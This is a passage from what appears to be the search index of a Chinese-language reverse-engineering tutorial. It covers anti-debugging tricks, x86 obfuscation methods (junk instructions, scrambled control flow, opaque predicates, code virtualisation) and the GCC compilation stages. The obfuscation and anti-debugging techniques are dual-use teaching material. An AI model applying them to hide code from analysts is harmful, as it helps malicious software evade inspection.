context.Dr3!=0) { return 1; } return 0; } \u884c\u4e3a\u5360\u7528 \u884c\u4e3a\u5360\u7528\u662f\u6307\u5728\u9700\u8981\u4fdd\u62a4\u7684\u7a0b\u5e8f\u4e2d\uff0c\u7a0b\u5e8f\u81ea\u8eab\u5c06\u4e00\u4e9b\u53ea\u80fd\u540c\u65f6\u6709 1 \u4e2a\u5b9e\u4f8b\u7684\u529f\u80fd\u5360\u4e3a\u5df1\u7528\u3002\u6bd4\u5982\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u80fd\u540c\u65f6\u88ab 1 \u4e2a\u8c03\u8bd5\u5668\u8c03\u8bd5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u8bbe\u8ba1\u4e00\u79cd\u6a21\u5f0f\uff0c\u5c06\u7a0b\u5e8f\u4ee5\u8c03\u8bd5\u65b9\u5f0f\u542f\u52a8\uff0c\u7136\u540e\u5229\u7528\u7cfb\u7edf\u7684\u8c03\u8bd5\u673a\u5236\u9632\u6b62\u88ab\u5176\u4ed6\u8c03\u8bd5\u5668\u8c03\u8bd5\u3002 \u6307\u4ee4\u6df7\u6dc6 \u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u4ee4\u6df7\u6dc6 \u5e38\u89c1\u7684\u6df7\u6dc6\u65b9\u6cd5 \u4ee3\u7801\u865a\u62df\u5316 \u4e3a\u4ec0\u4e48\u9700\u8981\u6307\u4ee4\u6df7\u6dc6 \u8f6f\u4ef6\u7684\u5b89\u5168\u6027\u4e25\u91cd\u4f9d\u8d56\u4e8e\u4ee3\u7801\u590d\u6742\u5316\u540e\u88ab\u5206\u6790\u8005\u7406\u89e3\u7684\u96be\u5ea6\uff0c\u901a\u8fc7\u6307\u4ee4\u6df7\u6dc6\uff0c\u53ef\u4ee5\u5c06\u539f\u59cb\u7684\u4ee3\u7801\u6307\u4ee4\u8f6c\u6362\u4e3a\u7b49\u4ef7\u4f46\u6781\u5176\u590d\u6742\u7684\u6307\u4ee4\uff0c\u4ece\u800c\u5c3d\u53ef\u80fd\u5730\u63d0\u9ad8\u5206\u6790\u548c\u7834\u89e3\u7684\u6210\u672c\u3002 \u5e38\u89c1\u7684\u6df7\u6dc6\u65b9\u6cd5 \u4ee3\u7801\u53d8\u5f62 \u4ee3\u7801\u53d8\u5f62\u662f\u6307\u5c06\u5355\u6761\u6216\u591a\u6761\u6307\u4ee4\u8f6c\u53d8\u4e3a\u7b49\u4ef7\u7684\u5355\u6761\u6216\u591a\u6761\u5176\u4ed6\u6307\u4ee4\u3002\u5176\u4e2d\u5bf9\u5355\u6761\u6307\u4ee4\u7684\u53d8\u5f62\u53eb\u505a\u5c40\u90e8\u53d8\u5f62\uff0c\u5bf9\u591a\u6761\u6307\u4ee4\u7ed3\u5408\u8d77\u6765\u8003\u8651\u7684\u53d8\u6210\u53eb\u505a\u5168\u5c40\u53d8\u5f62\u3002 \u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\u7684\u4e00\u6761\u8d4b\u503c\u6307\u4ee4\uff1a mov eax, 12345678h \u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u7ec4\u5408\u6307\u4ee4\u6765\u66ff\u4ee3\uff1a push 12345678h pop eax \u66f4\u8fdb\u4e00\u6b65\uff1a pushfd mov eax, 1234 shl eax, 10 mov ax, 5678 popfd pushfd \u548c popfd \u662f\u4e3a\u4e86\u4fdd\u62a4 EFLAGS \u5bc4\u5b58\u5668\u4e0d\u53d7\u53d8\u5f62\u540e\u6307\u4ee4\u7684\u5f71\u54cd\u3002 \u7ee7\u7eed\u66ff\u6362\uff1a pushfd push 1234 pop eax shl eax, 10 mov ax 5678 \u8fd9\u6837\u7684\u7ed3\u679c\u5c31\u662f\u7b80\u5355\u7684\u6307\u4ee4\u4e5f\u53ef\u80fd\u4f1a\u53d8\u6210\u4e0a\u767e\u4e0a\u5343\u6761\u6307\u4ee4\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u7406\u89e3\u7684\u96be\u5ea6\u3002 \u518d\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a jmp {label} \u53ef\u4ee5\u53d8\u6210\uff1a push {label} ret \u800c\u4e14 IDA \u4e0d\u80fd\u8bc6\u522b\u51fa\u8fd9\u79cd label \u6807\u7b7e\u7684\u8c03\u7528\u7ed3\u6784\u3002 \u6307\u4ee4\uff1a call {label} \u53ef\u4ee5\u66ff\u6362\u6210\uff1a push {call\u6307\u4ee4\u540e\u9762\u7684\u90a3\u4e2alabel} push {label} ret \u6307\u4ee4\uff1a push {op} \u53ef\u4ee5\u66ff\u6362\u6210\uff1a sub esp, 4 mov [esp], {op} \u4e0b\u9762\u6211\u4eec\u6765\u770b\u770b\u5168\u5c40\u53d8\u5f62\u3002\u5bf9\u4e8e\u4e0b\u9762\u7684\u4ee3\u7801\uff1a mov eax, ebx mov ecx, eax \u56e0\u4e3a\u4e24\u6761\u4ee3\u7801\u5177\u6709\u5173\u8054\u6027\uff0c\u5728\u53d8\u5f62\u65f6\u9700\u8981\u7efc\u5408\u8003\u8651\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a mov cx, bx mov ax, cx mov ch, bh mov ah, bh \u8fd9\u79cd\u5177\u6709\u5173\u8054\u6027\u7684\u7279\u5b9a\u4f7f\u5f97\u901a\u8fc7\u53d8\u5f62\u540e\u7684\u4ee3\u7801\u63a8\u5bfc\u53d8\u5f62\u524d\u7684\u4ee3\u7801\u66f4\u52a0\u56f0\u96be\u3002 \u82b1\u6307\u4ee4 \u82b1\u6307\u4ee4\u5c31\u662f\u5728\u539f\u59cb\u6307\u4ee4\u4e2d\u63d2\u5165\u4e00\u4e9b\u867d\u7136\u53ef\u4ee5\u88ab\u6267\u884c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\u7684\u6307\u4ee4\uff0c\u5b83\u7684\u51fa\u73b0\u53ea\u662f\u4e3a\u4e86\u6270\u4e71\u5206\u6790\uff0c\u4e0d\u4ec5\u662f\u5bf9\u5206\u6790\u8005\u6765\u8bf4\uff0c\u8fd8\u662f\u5bf9\u53cd\u6c47\u7f16\u5668\u3001\u8c03\u8bd5\u5668\u6765\u8bf4\u3002 \u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u539f\u59cb\u6307\u4ee4\u5982\u4e0b\uff1a add eax, ebx mul ecx \u52a0\u5165\u82b1\u6307\u4ee4\u4e4b\u540e\uff1a xor esi, 011223344h add esi, eax add eax, ebx mov edx, eax shl edx, 4 mul ecx xor esi, ecx \u5176\u4e2d\u4f7f\u7528\u4e86\u6e90\u7a0b\u5e8f\u4e0d\u4f1a\u4f7f\u7528\u5230\u7684 esi \u548c edx \u5bc4\u5b58\u5668\u3002\u8fd9\u5c31\u662f\u4e00\u79cd\u7eaf\u7cb9\u7684\u5783\u573e\u6307\u4ee4\u3002 \u6709\u7684\u82b1\u6307\u4ee4\u7528\u4e8e\u5e72\u6270\u53cd\u6c47\u7f16\u5668\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a 01003689 50 push eax 0100368A 53 push ebx \u52a0\u5165\u82b1\u6307\u4ee4\u540e\uff1a 01003689 50 push eax 0100368A EB 01 jmp short 0100368D 0100368C FF53 6A call dword ptr [ebx+6A] \u4e4d\u4e00\u770b\u4f3c\u4e4e\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u662f\u52a0\u5165\u56e0\u4e3a\u52a0\u5165\u4e86\u673a\u5668\u7801 EB 01 FF \uff0c\u4f7f\u5f97\u7ebf\u6027\u5206\u6790\u7684\u53cd\u6c47\u7f16\u5668\u4ea7\u751f\u4e86\u8bef\u5224\u3002\u800c\u5728\u6267\u884c\u65f6\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u4f1a\u8df3\u8f6c\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\uff0c\u6d41\u7a0b\u5982\u4e0b\uff1a 01003689 50 push eax 0100368A EB 01 jmp short 0100368D 0100368C 90 nop 0100368D 53 push ebx \u6270\u4e71\u6307\u4ee4\u5e8f\u5217 \u6307\u4ee4\u4e00\u822c\u90fd\u662f\u6309\u7167\u4e00\u5b9a\u5e8f\u5217\u6267\u884c\u7684\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6837\uff1a 01003689 push eax 0100368A push ebx 0100368B xor eax, eax 0100368D cmp eax, 0 01003690 jne short 01003695 01003692 inc eax 01003693 jmp short 0100368D 01003695 pop ebx 01003696 pop eax \u6307\u4ee4\u5e8f\u5217\u770b\u8d77\u6765\u5f88\u6e05\u6670\uff0c\u6240\u4ee5\u6270\u4e71\u6307\u4ee4\u5e8f\u5217\u5c31\u662f\u8981\u6253\u4e71\u8fd9\u79cd\u6307\u4ee4\u7684\u6392\u5217\u65b9\u5f0f\uff0c\u4ee5\u5e72\u6270\u5206\u6790\u8005\uff1a 01003689 push eax 0100368A jmp short 01003694 0100368C xor eax, eax 0100368E jmp short 01003697 01003690 jne short 0100369F 01003692 jmp short 0100369C 01003694 push ebx 01003695 jmp short 0100368C 01003697 cmp eax, 0 0100369A jmp short 01003690 0100369C inc eax 0100369D jmp short 01003697 0100369F pop ebx 010036A0 pop eax \u867d\u7136\u770b\u8d77\u6765\u5f88\u4e71\uff0c\u4f46\u771f\u5b9e\u7684\u6267\u884c\u987a\u5e8f\u6ca1\u6709\u6539\u53d8\u3002 \u591a\u5206\u652f \u591a\u5206\u652f\u662f\u6307\u5229\u7528\u4e0d\u540c\u7684\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u590d\u6742\u5316\u3002\u4e0e\u6270\u4e71\u6307\u4ee4\u5e8f\u5217\u4e0d\u540c\u7684\u65f6\uff0c\u591a\u5206\u652f\u6539\u53d8\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a 01003689 push eax 0100368A push ebx 0100368B push ecx 0100368C push edx \u53d8\u5f62\u5982\u4e0b\uff1a 01003689 push eax 0100368A je short 0100368F 0100368C push ebx 0100368D jmp short 01003690 0100368F push ebx 01003690 push ecx 01003691 push edx \u4ee3\u7801\u91cc\u52a0\u5165\u4e86\u4e00\u4e2a\u6761\u4ef6\u5206\u652f\uff0c\u4f46\u5b83\u7a76\u7adf\u4f1a\u4e0d\u4f1a\u89e6\u53d1\u6211\u4eec\u5e76\u4e0d\u5173\u5fc3\u3002\u4e8e\u662f\u7a0b\u5e8f\u5177\u6709\u4e86\u4e0d\u786e\u5b9a\u6027\uff0c\u9700\u8981\u5728\u6267\u884c\u65f6\u624d\u80fd\u786e\u5b9a\u3002\u4f46\u53ef\u4ee5\u80af\u5b9a\u7684\u65f6\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u548c\u539f\u4ee3\u7801\u76f8\u540c\u3002 \u518d\u6539\u8fdb\u4e00\u4e0b\uff0c\u7528\u4e0d\u540c\u7684\u4ee3\u7801\u66ff\u6362\u5206\u652f\u5904\u7684\u4ee3\u7801\uff1a 01003689 push eax 0100368A je short 0100368F 0100368C push ebx 0100368D jmp short 01003693 0100368F push eax 01003690 mov dword ptr [esp], ebx 01003693 push ecx 01003694 push edx \u4e0d\u900f\u660e\u8c13\u8bcd \u4e0d\u900f\u660e\u8c13\u8bcd\u662f\u6307\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u5728\u6267\u884c\u5230\u67d0\u5904\u65f6\uff0c\u5bf9\u7a0b\u5e8f\u5458\u800c\u8a00\u662f\u5df2\u77e5\u7684\uff0c\u4f46\u7f16\u8bd1\u5668\u6216\u9759\u6001\u5206\u6790\u5668\u65e0\u6cd5\u63a8\u65ad\u51fa\u8fd9\u4e2a\u503c\uff0c\u53ea\u80fd\u5728\u8fd0\u884c\u65f6\u786e\u5b9a\u3002\u4e0a\u9762\u7684\u591a\u5206\u652f\u5176\u5b9e\u4e5f\u662f\u5229\u7528\u4e86\u4e0d\u900f\u660e\u8c13\u8bcd\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\uff1a mov esi, 1 ... ; some code not touching esi dec esi ... cmp esi, 0 jz real_code ; fake luggage real_code: \u5047\u8bbe\u6211\u4eec\u77e5\u9053\u8fd9\u91cc esi \u7684\u503c\u80af\u5b9a\u662f 0\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5728 fake luggage \u5904\u63d2\u5165\u4efb\u610f\u957f\u5ea6\u548c\u590d\u6742\u5ea6\u7684\u6307\u4ee4\uff0c\u4ee5\u8fbe\u5230\u6df7\u6dc6\u7684\u76ee\u7684\u3002 \u5176\u5b83\u7684\u4f8b\u5b50\u8fd8\u6709\uff08\u540c\u6837\u5047\u8bbeesi\u4e3a0\uff09\uff1a add eax, ebx mul ecx add eax, esi \u95f4\u63a5\u6307\u9488 dummy_data1 db 100h dup (0) message1 db 'hello world', 0 dummy_data2 db 200h dup (0) message2 db 'another message', 0 func proc ... mov eax, offset dummy_data1 add eax, 100h push eax call dump_string ... mov eax, offset dummy_data2 add eax, 200h push eax call dump_string ... func endp \u8fd9\u91cc\u901a\u8fc7 dummy_data \u6765\u95f4\u63a5\u5730\u5f15\u7528 message\uff0c\u4f46 IDA \u5c31\u4e0d\u80fd\u6b63\u786e\u5730\u5206\u6790\u5230\u5bf9 message \u7684\u5f15\u7528\u3002 \u4ee3\u7801\u865a\u62df\u5316 \u57fa\u4e8e\u865a\u62df\u673a\u7684\u4ee3\u7801\u4fdd\u62a4\u4e5f\u53ef\u4ee5\u7b97\u662f\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u7684\u4e00\u79cd\uff0c\u662f\u76ee\u524d\u5404\u79cd\u6df7\u6dc6\u4e2d\u4fdd\u62a4\u6548\u679c\u6700\u597d\u7684\u3002\u7b80\u5355\u5730\u8bf4\uff0c\u8be5\u6280\u672f\u5c31\u662f\u901a\u8fc7\u8bb8\u591a\u6a21\u62df\u4ee3\u7801\u6765\u6a21\u62df\u88ab\u4fdd\u62a4\u7684\u4ee3\u7801\u7684\u6267\u884c\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u4e0e\u88ab\u4fdd\u62a4\u4ee3\u7801\u6267\u884c\u65f6\u76f8\u540c\u7684\u7ed3\u679c\u3002 +------------+ | \u5934\u90e8\u6307\u4ee4\u5e8f\u5217 | -------> | \u4ee3\u7801\u865a\u62df\u673a\u5165\u53e3 | |------------| | | | | \u4fdd\u5b58\u4ee3\u7801\u73b0\u573a | | | | | \u4e2d\u95f4\u6307\u4ee4\u5e8f\u5217 | | \u6a21\u62df\u6267\u884c\u4e2d\u95f4\u6307\u4ee4\u5e8f\u5217 | | | | | | | \u8bbe\u7f6e\u65b0\u7684\u4ee3\u7801\u73b0\u573a | |------------| | | \u5c3e\u90e8\u6307\u4ee4\u5e8f\u5217 | <------- | \u4ee3\u7801\u865a\u62df\u673a\u51fa\u53e3 | +------------+ \u5f53\u539f\u59cb\u6307\u4ee4\u6267\u884c\u5230\u6307\u4ee4\u5e8f\u5217\u7684\u5f00\u59cb\u5904\uff0c\u5c31\u8f6c\u5165\u4ee3\u7801\u865a\u62df\u673a\u7684\u5165\u53e3\u3002\u6b64\u65f6\u9700\u8981\u4fdd\u5b58\u5f53\u524d\u7ebf\u7a0b\u7684\u4e0a\u4e0b\u6587\u4fe1\u606f\uff0c\u7136\u540e\u8fdb\u5165\u6a21\u62df\u6267\u884c\u9636\u6bb5\uff0c\u8be5\u9636\u6bb5\u662f\u4ee3\u7801\u865a\u62df\u673a\u7684\u6838\u5fc3\u3002\u6709\u4e24\u79cd\u65b9\u6848\u6765\u4fdd\u8bc1\u865a\u62df\u673a\u4ee3\u7801\u4e0e\u539f\u59cb\u4ee3\u7801\u7684\u6808\u7a7a\u95f4\u4f7f\u7528\u4e92\u4e0d\u51b2\u7a81\uff0c\u4e00\u79cd\u662f\u5728\u5806\u4e0a\u5f00\u8f9f\u5f00\u8f9f\u65b0\u7684\u7a7a\u95f4\uff0c\u53e6\u4e00\u79cd\u662f\u7ee7\u7eed\u4f7f\u7528\u539f\u59cb\u4ee3\u7801\u6240\u4f7f\u7528\u7684\u6808\u7a7a\u95f4\uff0c\u8fd9\u4e24\u79cd\u65b9\u6848\u4e92\u6709\u4f18\u52a3\uff0c\u5728\u5b9e\u9645\u4e2d\u7b2c\u4e8c\u79cd\u4f7f\u7528\u8f83\u591a\u3002 \u5bf9\u4e8e\u600e\u6837\u6a21\u62df\u539f\u59cb\u4ee3\u7801\uff0c\u540c\u6837\u6709\u4e24\u79cd\u65b9\u6848\u3002\u4e00\u79cd\u662f\u5c06\u539f\u672c\u7684\u6307\u4ee4\u5e8f\u5217\u8f6c\u53d8\u4e3a\u4e00\u79cd\u5177\u6709\u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5bf9\u5e94\u5173\u7cfb\u7684\uff0c\u53ea\u6709\u865a\u62df\u673a\u624d\u80fd\u7406\u89e3\u7684\u4ee3\u7801\u6570\u636e\u3002\u4f8b\u5982\u7528 0 \u6765\u8868\u793a push \uff0c 1 \u8868\u793a mov \u7b49\u3002\u8fd9\u79cd\u76f4\u63a5\u6216\u95f4\u63a5\u7b49\u4ef7\u7684\u6570\u636e\u79f0\u4e3a opcode\u3002\u53e6\u4e00\u79cd\u65b9\u6848\u662f\u5c06\u539f\u59cb\u4ee3\u7801\u7684\u610f\u4e49\u76f4\u63a5\u8f6c\u6362\u6210\u65b0\u7684\u4ee3\u7801\uff0c\u7c7b\u4f3c\u4e8e\u4ee3\u7801\u53d8\u5f62\uff0c\u8fd9\u79cd\u65b9\u6848\u57fa\u4e8e\u6307\u4ee4\u8bed\u4e49\uff0c\u6240\u4ee5\u8bbe\u8ba1\u96be\u5ea6\u975e\u5e38\u5927\u3002","title":"\u9006\u5411\u5de5\u7a0b\u4e0e\u6c47\u7f16\u8bed\u8a00"},{"location":"Tutorial/Material/Reverse/#_1","text":"","title":"\u9006\u5411\u5de5\u7a0b\u4e0e\u6c47\u7f16\u8bed\u8a00"},{"location":"Tutorial/Material/Reverse/#c","text":"\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6 C \u8bed\u8a00\u6807\u51c6\u5e93 \u6574\u6570\u8868\u793a \u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570 \u5173\u4e8e C++","title":"C \u8bed\u8a00\u57fa\u7840"},{"location":"Tutorial/Material/Reverse/#_2","text":"\u6211\u4eec\u4ee5\u7ecf\u5178\u8457\u4f5c\u300aThe C Programming Language\u300b\u4e2d\u7684\u7b2c\u4e00\u4e2a\u7a0b\u5e8f \u201cHello World\u201d \u4e3a\u4f8b\uff0c\u8bb2\u89e3 Linux \u4e0b GCC \u7684\u7f16\u8bd1\u8fc7\u7a0b\u3002 #include <stdio.h> main() { printf(\"hello, world\\n\"); } $gcc hello.c $./a.out hello world \u4ee5\u4e0a\u8fc7\u7a0b\u53ef\u5206\u4e3a4\u4e2a\u6b65\u9aa4\uff1a\u9884\u5904\u7406\uff08Preprocessing\uff09\u3001\u7f16\u8bd1\uff08Compilation\uff09\u3001\u6c47\u7f16\uff08Assembly\uff09\u548c\u94fe\u63a5\uff08Linking\uff09\u3002","title":"\u4ece\u6e90\u4ee3\u7801\u5230\u53ef\u6267\u884c\u6587\u4ef6"},{"location":"Tutorial/Material/Reverse/#_3","text":"gcc -E hello.c -o hello.i # 1 \"hello.c\" # 1 \"<built-in>\" # 1 \"<command-line>\" ...... extern int printf (const char *__restrict __format, ...); ...... main() { printf(\"hello, world\\n\"); } \u9884\u7f16\u8bd1\u8fc7\u7a0b\u4e3b\u8981\u5904\u7406\u6e90\u4ee3\u7801\u4e2d\u4ee5 \u201c#\u201d \u5f00\u59cb\u7684\u9884\u7f16\u8bd1\u6307\u4ee4\uff1a \u5c06\u6240\u6709\u7684 \u201c#define\u201d \u5220\u9664\uff0c\u5e76\u4e14\u5c55\u5f00\u6240\u6709\u7684\u5b8f\u5b9a\u4e49\u3002 \u5904\u7406\u6240\u6709\u6761\u4ef6\u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5982 \u201c#if\u201d\u3001\u201c#ifdef\u201d\u3001\u201c#elif\u201d\u3001\u201c#else\u201d\u3001\u201c#endif\u201d\u3002 \u5904\u7406 \u201c#include\u201d \u9884\u7f16\u8bd1\u6307\u4ee4\uff0c\u5c06\u88ab\u5305\u542b\u7684\u6587\u4ef6\u63d2\u5165\u5230\u8be5\u9884\u7f16\u8bd1\u6307\u4ee4\u7684\u4f4d\u7f6e\u3002\u6ce8\u610f\uff0c\u8be5\u8fc7\u7a0b\u9012\u5f52\u6267\u884c\u3002 \u5220\u9664\u6240\u6709\u6ce8\u91ca\u3002 \u6dfb\u52a0\u884c\u53f7\u548c\u6587\u4ef6\u540d\u6807\u53f7\u3002 \u4fdd\u7559\u6240\u6709\u7684 #pragma \u7f16\u8bd1\u5668\u6307\u4ee4\u3002","title":"\u9884\u7f16\u8bd1"},{"location":"Tutorial/Material/Reverse/#_4","text":"gcc -S hello.c -o hello.s .file \"hello.c\" .section .rodata .LC0: .string \"hello, world\" .text .globl main .type main, @function main: .LFB0: .cfi_startproc pushq %rbp .cfi_def_cfa_offset 16 .cfi_offset 6, -16 movq %rsp, %rbp .cfi_def_cfa_register 6 leaq .LC0(%rip), %rdi call puts@PLT movl $0, %eax popq %rbp .cfi_def_cfa 7, 8 ret .cfi_endproc .LFE0: .size main, .-main .ident \"GCC: (GNU) 7.2.0\" .section .note.GNU-stack,\"\",@progbits \u7f16\u8bd1\u8fc7\u7a0b\u5c31\u662f\u628a\u9884\u5904\u7406\u5b8c\u7684\u6587\u4ef6\u8fdb\u884c\u4e00\u7cfb\u5217\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u53ca\u4f18\u5316\u540e\u751f\u6210\u76f8\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u6587\u4ef6\u3002","title":"\u7f16\u8bd1"},{"location":"Tutorial/Material/Reverse/#_5","text":"$ gcc -c hello.s -o hello.o \u6216\u8005 $gcc -c hello.c -o hello.o $ objdump -sd hello.o hello.o: file format elf64-x86-64 Contents of section .text: 0000 554889e5 488d3d00 000000e8 00000000 UH..H.=......... 0010 b8000000 005dc3 .....]. Contents of section .rodata: 0000 68656c6c 6f2c2077 6f726c64 00 hello, world. Contents of section .comment: 0000 00474343 3a202847 4e552920 372e322e .GCC: (GNU) 7.2. 0010 3000 0. Contents of section .eh_frame: 0000 14000000 00000000 017a5200 01781001 .........zR..x.. 0010 1b0c0708 90010000 1c000000 1c000000 ................ 0020 00000000 17000000 00410e10 8602430d .........A....C. 0030 06520c07 08000000 .R...... Disassembly of section .text: 0000000000000000 <main>: 0: 55 push %rbp 1: 48 89 e5 mov %rsp,%rbp 4: 48 8d 3d 00 00 00 00 lea 0x0(%rip),%rdi # b <main+0xb> b: e8 00 00 00 00 callq 10 <main+0x10> 10: b8 00 00 00 00 mov $0x0,%eax 15: 5d pop %rbp 16: c3 retq \u6c47\u7f16\u5668\u5c06\u6c47\u7f16\u4ee3\u7801\u8f6c\u53d8\u6210\u673a\u5668\u53ef\u4ee5\u6267\u884c\u7684\u6307\u4ee4\u3002","title":"\u6c47\u7f16"},{"location":"Tutorial/Material/Reverse/#_6","text":"gcc hello.o -o hello $ objdump -d -j .text hello ...... 000000000000064a <main>: 64a: 55 push %rbp 64b: 48 89 e5 mov %rsp,%rbp 64e: 48 8d 3d 9f 00 00 00 lea 0x9f(%rip),%rdi # 6f4 <_IO_stdin_used+0x4> 655: e8 d6 fe ff ff callq 530 <puts@plt> 65a: b8 00 00 00 00 mov $0x0,%eax 65f: 5d pop %rbp 660: c3 retq 661: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 668: 00 00 00 66b: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) ...... \u76ee\u6807\u6587\u4ef6\u9700\u8981\u94fe\u63a5\u4e00\u5927\u5806\u6587\u4ef6\u624d\u80fd\u5f97\u5230\u6700\u7ec8\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e0a\u9762\u53ea\u5c55\u793a\u4e86\u94fe\u63a5\u540e\u7684 main \u51fd\u6570\uff0c\u53ef\u4ee5\u548c hello.o \u4e2d\u7684 main \u51fd\u6570\u4f5c\u5bf9\u6bd4\uff09\u3002\u94fe\u63a5\u8fc7\u7a0b\u4e3b\u8981\u5305\u62ec\u5730\u5740\u548c\u7a7a\u95f4\u5206\u914d\uff08Address and Storage Allocation\uff09\u3001\u7b26\u53f7\u51b3\u8bae\uff08Symbol Resolution\uff09\u548c\u91cd\u5b9a\u5411\uff08Relocation\uff09\u7b49\u3002","title":"\u94fe\u63a5"},{"location":"Tutorial/Material/Reverse/#gcc","text":"\u901a\u5e38\u5728\u7f16\u8bd1\u540e\u53ea\u4f1a\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u800c\u4e2d\u95f4\u8fc7\u7a0b\u751f\u6210\u7684 .i \u3001 .s \u3001 .o \u6587\u4ef6\u90fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53c2\u6570 -save-temps \u6c38\u4e45\u4fdd\u5b58\u8fd9\u4e9b\u4e34\u65f6\u7684\u4e2d\u95f4\u6587\u4ef6\u3002 $ gcc -save-temps hello.c $ ls a.out hello.c hello.i hello.o hello.s \u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\uff0cgcc \u9ed8\u8ba4\u4f7f\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u6240\u4ee5\u8fd9\u91cc\u751f\u6210\u7684 a.out \u5b9e\u9645\u4e0a\u662f\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002 $ file a.out a.out: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=533aa4ca46d513b1276d14657ec41298cafd98b1, not stripped \u4f7f\u7528\u53c2\u6570 --verbose \u53ef\u4ee5\u8f93\u51fa gcc \u8be6\u7ec6\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002 gcc hello.c -static --verbose \u4e1c\u897f\u5f88\u591a\uff0c\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e0b\u9762\u51e0\u6761\u4fe1\u606f\uff1a $ /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/cc1 -quiet -v hello.c -quiet -dumpbase hello.c -mtune=generic -march=x86-64 -auxbase hello -version -o /tmp/ccj1jUMo.s as -v --64 -o /tmp/ccAmXrfa.o /tmp/ccj1jUMo.s /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/collect2 -plugin /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/lto-wrapper -plugin-opt=-fresolution=/tmp/cc1l5oJV.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_eh -plugin-opt=-pass-through=-lc --build-id --hash-style=gnu -m elf_x86_64 -static /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crt1.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crti.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/crtbeginT.o -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0 -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib -L/lib/../lib -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../.. /tmp/ccAmXrfa.o --start-group -lgcc -lgcc_eh -lc --end-group /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/crtend.o /usr/lib/gcc/x86_64-pc-linux-gnu/7.2.0/../../../../lib/crtn.o \u4e09\u6761\u6307\u4ee4\u5206\u522b\u662f cc1 \u3001 as \u548c collect2 \uff0ccc1 \u662f gcc \u7684\u7f16\u8bd1\u5668\uff0c\u5c06 .c \u6587\u4ef6\u7f16\u8bd1\u4e3a .s \u6587\u4ef6\uff0cas \u662f\u6c47\u7f16\u5668\u547d\u4ee4\uff0c\u5c06 .s \u6587\u4ef6\u6c47\u7f16\u6210 .o \u6587\u4ef6\uff0ccollect2 \u662f\u94fe\u63a5\u5668\u547d\u4ee4\uff0c\u5b83\u662f\u5bf9\u547d\u4ee4 ld \u7684\u5c01\u88c5\u3002\u9759\u6001\u94fe\u63a5\u65f6\uff0cgcc \u5c06 C \u8bed\u8a00\u8fd0\u884c\u65f6\u5e93\u7684 5 \u4e2a\u91cd\u8981\u76ee\u6807\u6587\u4ef6 crt1.o \u3001 crti.o \u3001 crtbeginT.o \u3001 crtend.o \u3001 crtn.o \u548c -lgcc \u3001 -lgcc_eh \u3001 -lc \u8868\u793a\u7684 3 \u4e2a\u9759\u6001\u5e93\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002 \u66f4\u591a\u7684\u5185\u5bb9\u6211\u4eec\u4f1a\u5728 1.5.3 \u4e2d\u4e13\u95e8\u5bf9 ELF \u6587\u4ef6\u8fdb\u884c\u8bb2\u89e3\u3002","title":"gcc \u6280\u5de7"},{"location":"Tutorial/Material/Reverse/#c_1","text":"C 